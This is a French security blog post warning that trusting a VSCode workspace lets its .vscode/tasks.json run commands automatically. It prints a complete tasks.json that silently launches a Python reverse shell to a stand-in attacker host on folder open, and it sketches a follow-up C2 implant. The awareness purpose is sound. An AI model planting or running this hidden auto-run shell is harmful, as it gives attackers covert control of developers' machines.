---
Title: VSCode
bookToc: false
---

# VSCode : ne faites pas confiance aux auteurs ! 

<center>
<img src="../img/broken-vs-code.png" width="200px"/>
</center>


[41% des développeurs utilisent VSCode](https://blog.humancoders.com/les-39-statistiques-cles-sur-lusage-de-lia-par-les-developpeurs-3772/) et je pense que l'immense majorité a déjà rencontré ce message. Je pense également qu’une part non négligeable a cliqué sur “Yes, I trust the authors” sans trop réfléchir aux conséquences et sans même lire la totalité du texte. 

Aux autres, félicitations vous avez une certaine conscience de la sécurité. Mais pour ceux qui ont cliqué sur le bouton bleu sans lire l'avertissement, cet article vise à expliquer : pourquoi il ne faut surtout pas faire ça. 

 <center> <img src="../img/vscode-popup.png"></center>

## Il était une fois, un développeur innocent...
Prenons un scénario simple : Un développeur recherche un outil pour trier/parser/filtrer des données. Il poste un message sur un forum et un autre utilisateur lui envoi une archive contenant un outil écrit en python qui répond à son besoin. à l’ouverture du dossier, l’utilisateur clique sur “Yes, I trust the authors”. 

A ce moment, et comme l’indique la fenêtre d’avertissement de VSCode, le projet est ouvert avec toutes les fonctionnalités de VSCode, dont la fonctionnalité Tasks qui permet d’automatiser des tâches stockées dans le fichier `.vscode/tasks.json` (evidemment, avec les mêmes droits que l’utilisateur).  

### Côté développeur

Prenons le fichiers tasks suivant :

```json
    {
    "version": "2.0.0",
    "tasks": [
      {
        "label": "Run tests",
        "type": "shell",
        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attackerDomain.at\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"zsh\")'",
        "isBackground":true,
        "hide": true,
        "presentation": { "reveal": "never" },
        "problemMatcher": [],
        "runOptions": {
            "runOn":"folderOpen" 
          }
        }
      ]
    }
```

On a plusieurs choses intéressantes ici : 
- La ligne commande contient un reverse shell écrit en python. à l'exécution il va ouvrir une connexion entre la machine de la victime et le serveur contrôlé par l'attaquant. On aurait également pu mettre une commande powershell, bash ou autre.
- On observe la présence du champ `"runOn":"folderOpen"` qui permet de déclencher l'exécution de la commande à l'ouverture du dossier.
- On a les champs `hide`, `isBackground`, et surtout `"presentation": { "reveal": "never" }` qui permettent de garder l'exécution en arrière plan pour être le plus discret possible.


### Côté attaquant 

Et de son côté, l’attaquant voit un shell se connecter sur son port d’écoute : 
<center><img src="../img/revshell.png" width="400px"/></center>


Avec cette simple astuce, notre attaquand a un accès direct à la machine de notre victime. Avec le code fournit dans cet article, la connexion est plutôt précaire, mais il est tout à fait possible d'imaginer un scénario plus réaliste.

## Un cas plus réaliste...

Dans un cas un peu plus réaliste, le code python aurait télécharger un malware ou un implant C2 pour avoir une connexion stable est persistante comme dans le schéma ci-dessous :  

<center><img src="../img/vscode-schema.png" width="800px"/></center>

Cette attaque est bien plus redoutable car elle permet une connexion stable avec la victime et facilite l’exfiltration de données et l’évasion des EDR/XDR. Ainsi, il est même possible que l’utilisateur reste infecté pendant plusieurs semaines avant de s’en rendre compte. 

Pour se prémunir de ce genre d’attaque, il faut systématiquement vérifier les sources et extensions qui ne sont pas de confiance. Egalement, dans VSCode, on peut simple choisir de ne pas cliquer sur cet énorme bouton bleu pour prendre le temps de vérifier que tout est en ordre.